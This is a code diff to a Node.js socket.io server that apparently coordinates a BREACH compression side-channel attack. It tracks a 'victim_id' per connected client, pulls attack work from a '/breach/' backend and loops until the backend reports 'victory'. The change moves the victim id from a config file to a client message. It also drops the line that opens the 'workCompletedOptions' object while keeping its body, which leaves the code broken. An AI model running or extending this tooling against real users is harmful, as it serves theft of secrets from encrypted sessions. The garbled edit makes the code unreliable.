@@ -1,7 +1,6 @@
 const io = require('socket.io'),
       winston = require('winston'),
-      http = require('http'),
-      config = require('./config.js');
+      http = require('http');
 
 winston.remove(winston.transports.Console);
 winston.add(winston.transports.Console, {'timestamp': true});
@@ -16,7 +15,14 @@ var socket = io.listen(PORT);
 const BACKEND_HOST = 'localhost',
       BACKEND_PORT = '8000';
 
+
 socket.on('connection', function(client) {
+   
+    var victimId;
+    client.on('victim_id', function({victim_id}){
+	victimId = victim_id;
+    });
+
     winston.info('New connection from client ' + client.id);
 
     var doNoWork = function() {
@@ -27,7 +33,7 @@ socket.on('connection', function(client) {
         var getWorkOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
-            path: '/breach/get_work/' + config.victim_id
+            path: '/breach/get_work/' + victimId
         };
 
         var getWorkRequest = http.request(getWorkOptions, function(response) {
@@ -49,15 +55,13 @@ socket.on('connection', function(client) {
 
     var reportWorkCompleted = function(work) {
         var requestBodyString = JSON.stringify(work);
-
-        var workCompletedOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
             headers: {
                 'Content-Type': 'application/json',
                 'Content-Length': requestBodyString.length
             },
-            path: '/breach/work_completed/' + config.victim_id,
+            path: '/breach/work_completed/' + victimId,
             method: 'POST',
         };
 
@@ -70,7 +74,7 @@ socket.on('connection', function(client) {
                 winston.info('Got (work-completed) response from backend: ' + responseData);
                 var victory = JSON.parse(responseData)['victory'];
                 if (victory === false) {
-                    createNewWork();
+                    createNewWork(victimId);
                 }
             });
         });
